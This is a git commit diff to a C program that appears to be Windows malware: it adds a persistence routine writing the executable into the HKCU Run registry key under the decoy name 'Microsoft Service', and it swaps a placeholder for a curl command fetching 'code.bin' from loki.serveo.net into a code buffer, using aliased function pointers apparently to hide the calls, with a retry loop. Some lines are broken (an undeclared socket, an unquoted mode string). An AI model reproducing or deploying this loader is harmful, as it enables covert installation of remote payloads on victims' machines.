b0c7c50deb946c653d69b2470ff985a71b09c885
HaxL0p4 <haxl0p4@proton.me>
2024-07-28 03:59:26 +0200

    Update main.c

--- main.c
+++ main.c
@@ -1,11 +1,50 @@
-// Created By L0PA ;)
+// By HaxL0p4 ;)
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <windows.h>
+#include <winsock2.h>
+#include <windows.h>
+#include <winuser.h>
+#include <wininet.h>
+
+
+int bootRun() {
+    char err[128] = "Failed\n";
+    char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
+    TCHAR szPath[MAX_PATH];
+    DWORD pathLen = 0;
+
+    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
+    if (pathLen == 0) {
+        send(sock, err, sizeof(err), 0);
+        return -1;
+    }
+
+    HKEY NewVal;
+
+    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
+        send(sock, err, sizeof(err), 0);
+        return -1;
+    }
+
+    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
+    if (RegSetValueEx(NewVal, TEXT("Microsoft Service"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
+        RegCloseKey(NewVal);
+        send(sock, err, sizeof(err), 0);
+        return -1;
+    }
+    RegCloseKey(NewVal);
+    send(sock, suc, sizeof(suc), 0);
+    return 0;
+}
 
 int main() {
+    
+    bootRun();
+
+    start:
     FILE *(*f1)(const char *, const char *) = popen;
     size_t (*f2)(void *, size_t, size_t, FILE *) = fread;
     int (*f3)(FILE *) = pclose;
@@ -13,14 +52,15 @@ int main() {
     void *(*f5)(void *, const void *, size_t) = memcpy;
 
     FILE *fpipe;
-    char *command = "curl yourServer/paylolad.bin";
+    char *command = "curl https://loki.serveo.net/code.bin";
     char c = 0;
     unsigned char code[460];
     int counter = 0;
 
-    if (0 == (fpipe = (FILE*)f1(command, "r"))) {
-        perror("popen() failed");
-        exit(EXIT_FAILURE);
+
+    while(0 == (fpipe = (FILE*)f1(command, r))) {
+        Sleep(10);
+        goto start;
     }
 
     while (f2(&c, sizeof c, 1, fpipe)) {
